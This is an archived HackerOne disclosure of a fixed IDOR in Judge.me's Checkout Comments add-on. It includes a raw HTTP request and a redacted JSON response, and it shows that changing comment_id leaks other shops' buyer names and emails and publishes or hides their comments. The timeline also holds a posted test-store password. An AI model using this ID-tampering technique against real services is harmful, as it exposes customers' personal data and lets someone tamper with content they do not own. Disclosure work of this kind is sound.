---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/insecure-direct-object-reference-idor
  - env/web
substate: "resolved"
weakness: "Insecure Direct Object Reference (IDOR)"
enriched: true
body: true
date: 2022-03-31
submitted: 2021-11-26T00:21:26.546Z
bounty_usd: 1250
votes: 47
cve: []
program: "[[programs/judgeme|Judge.me ]]"
reporter: "errorinhuman"
source: "https://hackerone.com/reports/1410498"
title: "IDOR: leak buyer info & Publish/Hide foreign comments"
---
# IDOR: leak buyer info & Publish/Hide foreign comments

> **Severity:** High | **Bounty:** 1,250 USD | **Votes:** 47 | **Program:** Judge.me  | **Disclosed:** 2022-03-31

- Report: [https://hackerone.com/reports/1410498](https://hackerone.com/reports/1410498)
- CWE: Insecure Direct Object Reference (IDOR)
- Submitted: 2021-11-26T00:21:26.546Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

HI @judgeme!
I noticed that the attacker can learn email users who left feedback at the time of buying.

Step to reproduce:

1. Login to our store and install your 'Checkout Comments' addon
2. Make fake order in or store and write a comment

███

3. Then go to our Shopify `/admin/apps/checkout-comments/extensions/checkout_comments/comments`
4. Publish our comment and Intercept request with burp. Send request to Repeater. Request example:

POST /extensions/checkout_comments/curate_comment HTTP/1.1
Host: judge.me
Cookie: _judgeme_session=████████████████; _ga=GA1.2.1935027813.1637882690; _gid=GA1.2.2043288340.1637882690; _fbp=fb.1.1637882690590.2069272048; _gat_UA-28424713-2=1
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://judge.me/extensions/checkout_comments/comments?platform=shopify&shop_domain=test-hackerone-glis.myshopify.com&page=3&offset=50
X-Csrf-Token: ████==
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 23
Origin: https://judge.me
Te: trailers
Connection: close

comment_id=1&curated=ok



5. Edit `comment_id=random_id` and in Response we can see buyer information (for example):


`{"comment":{"id":1,"content":"classic dress watch for weddings","created_at":"over 3 years ago","product":{"title":"Dress Watch","url":"https://████.myshopify.com/products/dress-watch"},"buyer":{"name":"F F","email":"██████████@gmail.com"},"published_status":true,"published_status_text":"Published","curated":"ok"}}`


██████



Video POC:



██████

## Impact

Buyer information leaks and other

## Timeline

- **Report Filed**
- **Report Title Updated**
- **2021-11-26** @errorinhuman: UPDATE:

If we change :

curated=ok  - We publish any comment
curated=spam - We hide any comment

Thnx)
- **2021-11-26** @errorinhuman: UPDATE POC


█████
- **Report Needs More Info**
- **Report New**
- **2021-11-26** @errorinhuman: For verification you can go to my test domain product: [TestDomain](https://test-hackerone-glis.myshopify.com/products/test-product ) I left a review there - but he is in status "Hide". It is not published on the site.  It  `comment_id=████`
Log in to you store and catch request. paste in  `comment_id=████1&curated=ok` and you See a content, customer email and other info that does not belong to your account in response!

If we send  `comment_id=██████████1&curated=ok` then go to my product page [TestDomain](https://test-hackerone-glis.myshopify.com/products/test-product ) - you can see that comment is published.

If we send  `comment_id=█████1&curated=spam` then go to my product page [TestDomain](https://test-hackerone-glis.myshopify.com/products/test-product ) - you can see that comment is hide.

Thnx
- **2021-11-26** @errorinhuman: Sorry... my`comment_id=███`
- **2021-11-27** @errorinhuman: The essence of the vulnerability is that I do not have access to the Judge account for example for the site example.com I can collect all mail the name and surname of the text of the question and other user data with Checkout Question. And also publish / hide the use of comments on the site that I am not prenate. I do actions for someone else's accounts on your own behalf. For this, I do not need a Judge.me account for Example.com. And it is enough to register an account for the site that I am prenate (for example, Mysite.com) and then I have privileges that would learn / publish / hide data from someone else's Judge.me Account.

Best wishes @glister !

P.S. `comment_id=████` i hide so that you tested
- **2021-11-29** @errorinhuman: Hi team! Any updates?
- **2021-11-30** @errorinhuman: Store password `Triumf123` (because my store in dev mode) for test `comment_id=████████` Hide/Publish comment. 

Can you сheck report? thnx
- **2021-11-30** @errorinhuman: I am sorry, but 5 days - STATE = NEW
- **2021-12-02** @h1_analyst_ava: Hi @glister,
I've passed your report to the Judge.me  security group for a closer look. Once there is any information available we will be sure to let you know.
@sodacan
- **2021-12-02** @errorinhuman: Hi @sodacan  & @judgeme!

I would like to clarify this vulnerability. On the video we can see what I intercepted the request (when i publish comment in Checkout Comments admin panel ) with `comment_id=193665`  as in response to the request in the field `"url":"https://test-hackerone-glis.myshopify.com/products/test24"` -  This means that I have published a comment and received the buyer's data in your domain that is prenated me. But if we change `comment_id=` random  but  `comment_id` < 193665  we can publish/hide customer comments of another shops and See their data as (email,name,what product they bought)

P.S. what access we get to someone's data we can see when `comment_id=`  then `"url":`   It indicates which domain belongs to the data and to which product they are published
- **2021-12-03** @errorinhuman: Hi! Any updates?
- **Report Severity Updated**
- **2021-12-07** @linhdam: Hi @glister,

Sorry for the late reply and thanks for the report! We are able to reproduce it. We will work on a fix for this.
- **Report Triaged**
- **2021-12-07** @errorinhuman: thnx)
Why is it high and not critical?) There is also violations of rights and information about the user
- **Bounty Awarded**
- **2021-12-07** @linhdam: @glister Because there is a lost of confidentiality, but not a total lost. For integrity, there is a pretty small loss (publishing status), but there isn't a score for "pretty small", so we "round up" to "Low".
- **2021-12-07** @errorinhuman: thnx for bounty

@linhdam  There is a loss of buyer email)

Thank
- **Report Vulnerability Types Updated**
- **Report Retesting**
- **Report Title Updated**
- **User Completed Retest**
- **Report Retest Approved**
- **Report Triaged**
- **2021-12-10** @errorinhuman: HI @linhdam !


Sorry.  

Retest finding result

Are you able to reproduce the vulnerability report?

Yes - i wrote. Sorry i haven't chosen. The bug fixed(


Sorry again (  Can close report
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
